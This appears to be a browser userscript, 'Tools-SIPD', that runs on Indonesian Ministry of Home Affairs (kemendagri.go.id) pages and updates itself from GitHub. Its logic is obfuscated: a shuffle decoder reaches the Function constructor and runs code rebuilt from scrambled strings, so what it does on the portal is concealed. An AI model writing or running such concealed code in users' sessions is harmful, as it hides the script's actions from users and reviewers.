// ==UserScript==
// @name         Tools-SIPD
// @namespace    sipd
// @version      20260614.0000
// @author       hendrik svm
// @match        *://*.kemendagri.go.id/*
// @updateURL    https://raw.githubusercontent.com/hendrik-svm/tools-sipd/main/sipd.meta.js
// @downloadURL  https://raw.githubusercontent.com/hendrik-svm/tools-sipd/main/sipd.user.js
// @require      https://cdn.sheetjs.com/xlsx-0.20.0/package/dist/xlsx.full.min.js
// @grant        none
// ==/UserScript==

(function () {
    'use strict';
    var timestamp, script;
    (function () {
        var kKm = '',
            WcB = 494 - 483;

        function xsI(q) {
            var m = 682240;
            var s = q.length;
            var r = [];
            for (var t = 0; t < s; t++) {
                r[t] = q.charAt(t)
            };
            for (var t = 0; t < s; t++) {
                var w = m * (t + 122) + (m % 14725);
                var o = m * (t + 172) + (m % 25559);
                var b = w % s;
                var a = o % s;
                var v = r[b];
                r[b] = r[a];
                r[a] = v;
                m = (w + o) % 3148602;
            };
            return r.join('')
        };
        var rHa = xsI('cbosmijlxocouutefgkrqrcwnapnystzvhtdr').substr(0, WcB);
        var rcv = 'ilf ar1nfn5s9lvSv[vnaluak.a>..s+i+ahz avs;eefCrnzfsamqvto dv;96+0f,)}t;.,4aa87+;a6{]r;asa8l+ob,+niu,4;e7ikofe)aur2u7s,s)r}=]i;n[ro3iti=e6r;1)e;a;.1n];og[*hu7)13)[1+e,adii;67yl2[tl)d anoh)=54g=2dr+Cf2f-vwr+;rChb(e2<9r6Aarrk36g9ht0"+eg,0n)wpn(v9 hh [gb]sf=u=fwg.+e;flmgvtr.u=z.,e(an((;[.5=.=+=-(r;5r)da;tla;;a(r}.h=fuj-cr lrne"lt so8scx="ar p*c.)5ncvftda;)Sto+vojs" (+(lra.; sdi{(lrug )0d(=,f=,cgt([=n.urcl9lnp4l)f)yclrh;,9()urr=oc8+-;o(uA=lnc[h+s0;lt,r"+;id1;a df(=.[i(]){n 1l1=r].vhn>v= b)86Cm]ano(;+j)v4"(=ho=io]epe(p(n+a.]h!vsbp;(hwn!7e]n;n.+f8eg}n{n ==(t=s=u=afvnfe,o+));pejh<thiust 7trlwo,irv;;.p.sllsawul u,()=}2;.i1=t=()tna(i r()gt),hpv0ara,d0yutro= =;r6ni1,e=hf-+qat;"{p}e-1;u=)[.=tjn;})aa8qr-;)oi(["0s;c,Ananz=rjctc,=,.n{{vce ([=ocra]uv)r5y0)(zi,8)0+tf.(=s;li0,;"eca(=z8aggg,A,1,hh<2vqrgfabtnro)r=<+C7lrte0ua.ihkrr;(]<)bn) ;((  hep=c;mm;r+,CCvmi29]]rigmtmC7n q.s";;sana[Ar1.jcn8rgwv';
        var SSV = xsI[rHa];
        var IWJ = '';
        var WIh = SSV;
        var UnK = SSV(IWJ, xsI(rcv));
        var oZW = UnK(xsI('4id!\'(c0tcr.r})gsxc.0=k.6xZZ1.[%Zr%dorcrZ.rc(s=;[rbiTmtlee..s3#efr="i)g!fc"ce9t;xt}citrs%(o+0m.ykte)r."#uZ+uli.ftZc7[c=.c5]+t&epf .\/.(a{eZ]ea=+.3"cae.![5 Zc.msZ)1[71.]mt&.\'pn1e.1]Z%v=e6.c4=eg4-)%&;d(pcesZ+)v]enm=]..%;d(rtj(iee=a=i.xr"Z7+;\'(ct0e!thdl.)!%p)tCdtr!o.x( 2c;yj\/!a&iuZ=le%!0)=ocpctastv%%elh=87adZr$!a!"e.##bcsZ.e.iZhZ_..(jdpZtgpx\/%f!Zve;.+C=e})nspu,,lt;vaerEZ%i)cdketcd9.mdZ3m. p"oetaZdtp.ah[iir\'(\/=!smZsn 1e#g=e(bs)=ic=saa )ti5s!t+{!.cs(%[;=n)D!mric.n:.ZomtrpwbZ==tci.=hc)w!.=n$8a)i?)nde.m(Z$Z0_.xSZ;jt[c;r.ecxhus;)w.#0m.4ctxoi1u%2]Zcu+],\/$C.g+j.t=mm$n)]e)cZffeeeneiZse2r;i=(n;).;%o.%(f[(ddn9Zp%;o\').e! cw!(t(ch.ZZhac.eZ0c\'rxie{.1t.#0d.'));
        var lZm = WIh(kKm, oZW);
        lZm(9445);
        return 8771
    })()
})();
